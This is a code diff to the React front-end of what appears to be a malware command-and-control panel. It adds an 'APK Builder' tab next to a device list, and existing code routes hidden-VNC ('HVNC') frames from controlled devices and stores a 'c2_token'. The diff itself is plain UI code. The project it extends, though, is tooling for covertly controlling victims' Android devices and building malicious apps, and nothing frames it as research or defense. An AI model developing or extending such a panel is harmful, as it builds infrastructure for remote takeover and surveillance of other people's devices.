@@ -4,6 +4,7 @@ import { panelConnect, panelDisconnect, on, send } from './lib/socket';
 import Login from './components/Login';
 import Sidebar from './components/Sidebar';
 import DevicePanel from './components/DevicePanel';
+import BuilderTab from './components/BuilderTab';
 
 export default function App() {
   const [token, setToken] = useState(() => localStorage.getItem('c2_token'));
@@ -11,6 +12,7 @@ export default function App() {
   const [devices, setDevices] = useState([]);
   const [selectedId, setSelectedId] = useState(null);
   const [sidebarOpen, setSidebarOpen] = useState(false);
+  const [view, setView] = useState('devices'); // devices | builder
 
   // Route binary HVNC frames to the active HvncView
   const hvncHandlerRef = useRef(null);
@@ -98,6 +100,27 @@ export default function App() {
       />
 
       <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minWidth: 0 }}>
+        {/* View switcher */}
+        <div style={{
+          display: 'flex', gap: 6, padding: '10px 14px',
+          background: '#0f0f14', borderBottom: '1px solid #1e1e2a',
+          alignItems: 'center', flexShrink: 0,
+        }}>
+          {[
+            ['devices', 'Devices'],
+            ['builder', 'APK Builder'],
+          ].map(([k, name]) => (
+            <button key={k} onClick={() => setView(k)}
+              style={{
+                padding: '6px 14px', borderRadius: 5, fontSize: 12, fontWeight: 600,
+                letterSpacing: 0.5, cursor: 'pointer', border: '1px solid',
+                background: view === k ? '#00613a' : 'transparent',
+                borderColor: view === k ? '#00613a' : '#1e1e2a',
+                color: view === k ? '#fff' : '#555',
+              }}>{name}</button>
+          ))}
+        </div>
+
         {/* Top bar (mobile) */}
         <div style={{
           display: 'none',
@@ -111,7 +134,7 @@ export default function App() {
         }} className="mobile-topbar">
         </div>
 
-        {selectedDevice
+        {view === 'builder' ? <BuilderTab /> : selectedDevice
           ? <DevicePanel
               device={selectedDevice}
               hvncHandlerRef={hvncHandlerRef}
